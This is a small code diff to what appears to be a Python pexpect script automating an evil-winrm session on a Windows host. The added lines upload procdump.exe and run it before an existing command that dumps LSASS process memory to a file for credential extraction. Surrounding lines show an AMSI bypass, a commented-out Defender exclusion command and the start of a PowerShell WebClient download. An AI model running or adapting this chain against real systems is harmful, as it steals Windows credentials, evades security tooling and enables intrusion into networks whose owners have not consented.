@@ -34,6 +34,7 @@
 
       #set=r"set-mppreference -exclusionpath C:\\"
       set="Bypass-4MSI"
+      install_procdump="upload /tool/procdump.exe"
       dump="./procdump.exe -accepteula -ma lsass.exe lsass.dmp"
       ex_1="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
       ex_2="$webClient = New-Object System.Net.WebClient;"
@@ -44,6 +45,8 @@
       child.timeout = None
       child.expect(re.escape(winrm))
       child.sendline(set)
+      child.expect(re.escape(winrm))
+      child.sendline(install_procdump)
       child.expect(re.escape(winrm))
       child.sendline(dump)
       child.expect(re.escape(winrm))
